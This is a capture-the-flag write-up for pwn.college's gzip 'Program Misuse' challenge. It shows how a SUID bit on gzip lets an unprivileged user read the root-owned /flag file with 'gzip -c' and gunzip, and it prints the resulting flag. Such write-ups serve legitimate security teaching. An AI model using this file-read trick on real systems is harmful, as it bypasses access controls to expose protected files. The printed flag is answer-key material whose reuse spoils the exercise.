---
layout: page
title: "Challenge Name: gzip"
summary: "Writeup from Program Misuse"
major_type: "Platform"
parent_group: "pwn.college"
sub_module: "Program Misuse"
date: 2026-04-27
---

**Category**: Program Misuse  
**Platform**: pwn.college  
**Difficulty**: Begineer
**Date**: 2025-07-15  
**Author**: Himanshu Parate

---

## 🧠 Summary:
The challenge abuses a SUID bit set on `/usr/bin/gzip`, allowing an unprivileged user to read the root-owned flag file at `/flag`.

---

## 🔍 Enumeration

```bash
ls -l /usr/bin/gzip
```

output:
```
-rwsr-xr-x 1 root root 47480 Sep  5  2019 /usr/bin/gzip
```

-The `s` in `-rws` indicates it's a SUID binary.
-`gzip` runs with **root privileges**.

## 🚀 Exploitation

The `gzip` command is used to compress files in Linux using the .gz format, reducing their size for storage or transmission. 

But,

```bash
gzip -c /flag > myflag.gz
```
can be used to zip the flag file while moving its content to our own file:

```bash
gunzip myflag.gz
cat myflag
```

Output:
```
pwn.college{wAoshGL8m69nzbs2g2W_2SsL-A6.dlTNxwSM0IzMyEzW}
```

      
